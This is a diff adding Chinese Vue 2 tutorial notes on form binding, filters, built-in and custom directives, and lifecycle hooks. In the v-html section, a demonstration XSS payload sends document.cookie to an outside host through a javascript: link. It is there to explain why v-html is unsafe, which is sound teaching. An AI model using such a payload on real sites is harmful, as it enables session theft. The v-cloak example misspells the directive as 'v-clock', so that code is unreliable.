@@ -1943,3 +1943,636 @@ Vue监视数据的原理：
 </script>
 ```
 
+## 收集表单数据
+
+  **收集表单数据：**
+
+- `<input type="text"/>`，则v-model收集的是value值，用户输入的就是value值
+
+- `<input type="radio"/>`，则v-model收集的是value值，且要给标签配置value值
+
+- `<input type="checkbox"/>`
+
+  1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+
+  2.配置input的value属性:
+
+  ​	(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+
+  ​	(2)v-model的初始值是数组，那么收集的的就是value组成的数组
+
+- 备注：v-model的三个修饰符：
+
+  lazy：失去焦点再收集数据
+
+  number：输入字符串转为有效的数字
+
+  trim：输入首尾空格过滤
+
+**综合案例**
+
+```vue
+  <div id="root">
+    <form @submit.prevent="demo">
+      账号：<input type="text" v-model.trim="userInfo.account"><br><br />
+      密码：<input type="password" v-model="userInfo.password"><br><br />
+      年龄：<input type="number" v-model.number="userInfo.age"><br><br />
+      性别：
+      男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
+      女<input type="radio" name="sex" v-model="userInfo.sex" value="female"><br><br />
+      爱好：
+      唱<input type="checkbox" v-model="userInfo.hobby" value="sing">
+      跳<input type="checkbox" v-model="userInfo.hobby" value="dance">
+      Rap<input type="checkbox" v-model="userInfo.hobby" value="rap"><br><br />
+      所属校区
+      <select v-model="userInfo.city">
+        <option value="">请选择校区</option>
+        <option value="beijing">北京</option>
+        <option value="shanghai">上海</option>
+        <option value="zhejiang">浙江</option>
+      </select><br><br />
+      其他信息：
+      <textarea v-model.lazy="userInfo.other"></textarea><br><br />
+      <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.douyingc.cn">《用户协议》</a>
+      <button>提交</button>
+    </form>
+  </div>
+
+  <script>
+    // 阻止 vue 在启动时生成生产提示
+    Vue.config.productionTip = false
+    new Vue({
+      el: '#root',
+      data: {
+        userInfo: {
+          account: '',
+          password: '',
+          age: '',
+          sex: 'female',
+          hobby: [],
+          city: 'beijing',
+          other: '',
+          agree: '',
+        }
+      },
+      methods: {
+        demo() {
+          console.log(JSON.stringify(this.userInfo))
+        }
+      },
+    })
+```
+
+## 过滤器
+
+**过滤器：**
+
+- 定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）
+
+- 语法：
+
+  1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
+
+  2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
+
+- 备注：
+
+  1.过滤器也可以接收额外参数、多个过滤器也可以串联
+
+  2.并没有改变原本的数据, 是产生新的对应的数据
+
+**综合案例**
+
+```vue
+  <div id="root">
+    <h1>显示格式化后的时间</h1>
+    <!-- 计算属性实现 -->
+    <h2>计算属性实现，现在是：{{fmtTime}}</h2>
+    <!-- methods 实现 -->
+    <h2>methods实现，现在是：{{getFmtTime()}}</h2>
+    <!-- 过滤器实现 -->
+    <h2>过滤器实现，现在是：{{time | timeFormater}}</h2>
+    <!-- 过滤器实现（传参） -->
+    <h2>过滤器实现（传参），现在是：{{time | timeFormater('YYYY-MM-DD') | mySlice}}</h2>
+    <h2 :x="msg | mySlice">尚硅谷</h2>
+  </div>
+  <div id="root2">{{msg | mySlice}}</div>
+
+  <script>
+    // 阻止 vue 在启动时生成生产提示
+    Vue.config.productionTip = false
+    // 全局过滤器
+    Vue.filter('mySlice', function (value) {
+      return value.slice(0, 4)
+    })
+
+    new Vue({
+      el: '#root',
+      data: {
+        time: 1660119657557, // 时间戳
+        msg: 'hello，DouYing'
+      },
+      computed: {
+        fmtTime() {
+          return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
+        }
+      },
+      methods: {
+        getFmtTime() {
+          return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
+        }
+      },
+      // 局部过滤器
+      filters: {
+        timeFormater(value, str = 'YYYY-MM-DD HH:mm:ss') {
+          console.log('@', value)
+          return dayjs(value).format(str)
+        },
+        /* mySlice(value) {
+          return value.slice(0, 4)
+        } */
+      }
+    })
+    new Vue({
+      el: '#root2',
+      data: {
+        msg: '你好，DouYing'
+      }
+    })
+  </script>
+```
+
+## 内置指令
+
+**常用指令：**
+
+- v-text : 更新元素的 textContent（不会解析标签）
+- v-html : 更新元素的 innerHTML（会解析标签）
+- v-bind  : 单向绑定解析表达式, 可简写为 :xxx
+- v-model : 双向数据绑定
+- v-for   : 遍历数组/对象/字符串
+- v-on    : 绑定事件监听, 可简写为@
+- v-if    : 条件渲染（动态控制节点是否存存在）
+- v-else  : 条件渲染（动态控制节点是否存存在）
+- v-show  : 条件渲染 (动态控制节点是否展示)
+- v-cloak : 如果js文件是在div容器后才引入，那么会出现先渲染div界面，但却没有vue的内容，加上v-cloak，可以使得div容器先隐藏起来，在引入之后再自动出现，与 css 配合: [v-cloak] { display: none }
+
+### v-text指令
+
+**v-text指令：**
+
+- 作用：向其所在的节点中渲染文本内容
+- 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会
+
+```vue
+  <div id="root">
+    <div>{{name}}</div>
+    <div v-text="name"></div>
+    <div v-text="str"></div>
+  </div>
+
+  <script>
+    // 阻止 vue 在启动时生成生产提示
+    Vue.config.productionTip = false
+    new Vue({
+      el: '#root',
+      data: {
+        name: 'DouYing',
+        str: '<h2>你好啊！</h2>'
+      }
+    })
+  </script>
+```
+
+### v-html指令
+
+**v-html指令：**
+
+- 作用：向指定节点中渲染包含html结构的内容
+
+- 与插值语法的区别：
+
+  1.v-html会替换掉节点中所有的内容，{{xx}}则不会
+
+  2.v-html可以识别html结构
+
+- 严重注意：v-html有安全性问题！！！！
+
+  1.在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击
+
+  2.一定要在可信的内容上使用v-html，永不要用在用户提交的内容上
+
+```vue
+  <div id="root">
+    <div>{{name}}</div>
+    <div v-text="name"></div>
+    <div v-html="str"></div>
+  </div>
+
+  <script>
+    // 阻止 vue 在启动时生成生产提示
+    Vue.config.productionTip = false
+    new Vue({
+      el: '#root',
+      data: {
+        name: 'DouYing',
+        str: '<h2>你好啊！</h2>'
+      }
+    })
+  </script>
+```
+
+**泄露问题**
+
+![](https://gcore.jsdelivr.net/gh/DouYingc/blogimage/img/202208101957144.png)
+
+![](https://gcore.jsdelivr.net/gh/DouYingc/blogimage/img/202208101958453.png)
+
+```vue
+  <div id="root">
+    <div>{{name}}</div>
+    <div v-text="name"></div>
+    <div v-html="str"></div>
+    <div v-html="str2"></div>
+  </div>
+
+  <script>
+    // 阻止 vue 在启动时生成生产提示
+    Vue.config.productionTip = false
+    new Vue({
+      el: '#root',
+      data: {
+        name: 'DouYing',
+        str: '<h2>你好啊！</h2>',
+        str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>找到你想要的资源了！</a>'
+      }
+    })
+  </script>
+```
+
+![](https://gcore.jsdelivr.net/gh/DouYingc/blogimage/img/202208101958259.png)
+
+### v-clock指令
+
+**v-cloak指令（没有值）：**
+
+- 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性
+- 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
+
+```vue
+  <style>
+    [v-clock] {
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div id="root">
+    <h1 v-clock>{{name}}</h1>
+  </div>
+  <!-- 在 div 后引入 Vue -->
+  <script src="../js/vue.js"></script>
+</body>
+<script>
+  console.log(1)
+  // 阻止 vue 在启动时生成生产提示
+  Vue.config.productionTip = false
+  new Vue({
+    el: '#root',
+    data: {
+      name: 'DouYing'
+    }
+  })
+</script>
+```
+
+### v-once指令
+
+**v-once指令：**
+
+- v-once所在节点在初次动态渲染后，就视为静态内容了
+- 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能
+
+```vue
+<body>
+  
+  <div id="root">
+    <h1 v-once>初始化的n值是：{{n}}</h1>
+    <h1>当前的n值是：{{n}}</h1>
+    <button @click="n++">点我n+1</button>
+  </div>
+
+</body>
+
+<script>
+  // 阻止 vue 在启动时生成生产提示
+  Vue.config.productionTip = false
+  new Vue({
+    el: '#root',
+    data: {
+      n: '1'
+    }
+  })
+</script>
+```
+
+###   v-pre指令
+
+**v-pre指令：**
+
+- 跳过其所在节点的编译过程
+- 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译
+
+```vue
+<body>
+
+  <div id="root">
+    <h1 v-pre>Vue其实很简单</h1>
+    <h2>当前的n值是：{{n}}</h2>
+    <button @click="n++">点我n+1</button>
+  </div>
+
+</body>
+
+<script>
+  // 阻止 vue 在启动时生成生产提示
+  Vue.config.productionTip = false
+  new Vue({
+    el: '#root',
+    data: {
+      n: '1'
+    }
+  })
+</script>
+```
+
+## 自定义指令
+
+**自定义指令总结：**
+
+- 定义语法：
+
+  1.局部指令
+
+  new Vue({ new Vue({
+
+  directives:{指令名:配置对象} 或 directives{指令名:回调函数}
+
+  }) })
+
+  2.全局指令：
+
+  Vue.directive(指令名,配置对象) 或 Vue.directive(指令名,回调函数)
+
+- 配置对象中常用的3个回调
+
+  1.bind：指令与元素成功绑定时调用
+
+  2.inserted：指令所在元素被插入页面时调用
+
+  3.update：指令所在模板结构被重新解析时调用
+
+- 备注
+
+  1.指令定义时不加v-，但使用时要加v-；
+
+  2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
+
+需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍
+需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点
+
+### 函数式
+
+函数式 属于 对象式 的简写方式 只是写了 bind、update 没有书写 inserted
+
+```vue
+<body>
+
+  <div id="root">
+    <h1>{{name}}</h1>
+    <h1>当前的n值是：<span v-text="n"></span></h1>
+    <h1>放大10倍后的n值是：<span v-big="n"></span></h1>
+    <button @click="n++">点我n+1</button>
+  </div>
+
+</body>
+
+<script>
+  // 阻止 vue 在启动时生成生产提示
+  Vue.config.productionTip = false
+  new Vue({
+    el: '#root',
+    data: {
+      n: 1,
+      name: 'DouYing',
+    },
+    directives: {
+      // big 函数何时会被调用？ 1.指令与元素成功绑定时（一上来） 2.指令所在的模板被重新解析时
+      // element 真实的Dom元素 binding 本次绑定的所有信息
+      big(element, binding) {
+        // 如何验证 element 是真实 DOM
+        // 方式一:
+        console.dir(element) // 在控制台查看 身上拥有所有真实Dom的属性和方法
+        // // 方式二:
+        console.log(element instanceof HTMLElement) // instanceof 谁是不是谁的实例 控制台 true
+
+        element.innerText = binding.value * 10
+      }
+    }
+  })
+</script>
+```
+
+### 对象式
+
+```vue
+  <div id="root">
+    <h1>{{name}}</h1>
+    <h1>当前的n值是：<span v-text="n"></span></h1>
+    <h1>放大10倍后的n值是：<span v-big="n"></span></h1>
+    <button @click="n++">点我n+1</button>
+    <hr />
+    <input type="text" v-fbind:value="n">
+  </div>
+
+</body>
+
+<script>
+  // 阻止 vue 在启动时生成生产提示
+  Vue.config.productionTip = false
+  new Vue({
+    el: '#root',
+    data: {
+      n: 1,
+      name: 'DouYing',
+    },
+    directives: {
+      // big 函数何时会被调用？ 1.指令与元素成功绑定时（一上来） 2.指令所在的模板被重新解析时
+      // element 真实的Dom元素 binding 本次绑定的所有信息
+      big(element, binding) {
+        // 如何验证 element 是真实 DOM
+        // 方式一:
+        console.dir(element) // 在控制台查看 身上拥有所有真实Dom的属性和方法
+        // // 方式二:
+        console.log(element instanceof HTMLElement) // instanceof 谁是不是谁的实例 控制台 true
+
+        element.innerText = binding.value * 10
+      },
+      fbind: {
+        // 指令与元素成功绑定时（一上来）
+        bind(element, binding) {
+          element.value = binding.value
+        },
+        // 指令所在元素被插入页面时调用
+        inserted(element, binding) {
+          element.focus()
+        },
+        // 指令所在的模板被重新解析时
+        update(element, binding) {
+          element.value = binding.value
+        }
+      }
+    }
+  })
+</script>
+```
+
+### 注意点
+
+- 此时的this 是 window
+- 多个名称一起定义时使用 - ，不是驼峰命名法，如：big-number
+- 局部指令 和 全局指令
+
+```js
+// 定义全局指令  和 过滤器一样
+// 对象式
+Vue.directive('fbind',{
+	//指令与元素成功绑定时（一上来）
+	bind(element,binding){
+		element.value = binding.value
+	},
+	//指令所在元素被插入页面时
+	inserted(element,binding){
+		element.focus()
+	},
+	//指令所在的模板被重新解析时
+	update(element,binding){
+		element.value = binding.value
+	}
+}) 
+// 函数式
+Vue.directive('fbind',function(element,binding){
+			// 如何验证 element 是真实Dom元素
+			// 方式一:
+			console.dir(element) // 在控制台查看 身上拥有所有真实Dom的属性和方法
+			// 方式二:
+			console.log(element instanceof HTMLElement) // instanceof 谁是不是谁的实例 控制台 true 
+			console.log('big',this) //注意此处的this是window
+			// console.log('big')
+			element.innerText = binding.value * 10
+})
+```
+
+## Vue的生命周期
+
+
+
+
+
+
+
+### 引出Vue的生命周期
+
+**生命周期：**
+
+- 又名：生命周期回调函数、生命周期函数、生命周期钩子
+- 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数
+- 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的
+- 生命周期函数中的this指向是vm 或 组件实例对象
+
+**案例：给定初始透明度为1，透明度不断减少，减少到0又重新变为1**
+
+- 基本代码
+
+```vue
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>引出生命周期</title>
+		<!-- 引入Vue -->
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<div id="root">
+           <!--opacity 表示css的属性(不透明) opacity 表示数据的名-->
+			<h2 :style="{opacity: opacity}">欢迎学习Vue</h2>
+           <!-- 重名 对象的简写形式-->    
+           <h2 :style="{opacity}">欢迎学习Vue</h2>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+		
+		 new Vue({
+			el:'#root',
+			data:{
+				opacity:1
+			},
+		})
+	</script>
+</html>
+
+```
+
+- 方法1：设置外部定时器
+
+```vue
+// 方式一：不推荐，逻辑操作，Vue实例，代码层面是割裂开的
+<script type="text/javascript">
+	 const vm = new Vue({
+			el:'#root',
+			data:{
+				opacity:1
+			},
+			methods: {
+				
+			},
+		})
+		// 通过外部的定时器实现（不推荐）
+		// 循环定时器
+		setInterval(() => {
+			vm.opacity -= 0.01
+			if(vm.opacity <= 0) vm.opacity = 1 // 在透明度小于等于0时,让其变为1
+		},16)  //16 毫秒
+</script> 
+```
+
+- 方法2：mounted 钩子函数
+
+```vue
+<script type="text/javascript">
+	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+	
+	 new Vue({
+		el:'#root',
+		data:{
+			opacity:1
+		},
+		methods: {
+			
+		},
+		//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
+		mounted(){
+			console.log('mounted',this)
+			setInterval(() => {
+				this.opacity -= 0.01
+				if(this.opacity <= 0) this.opacity = 1
+			},16)
+		},
+	}) 
+</script>
+```
+
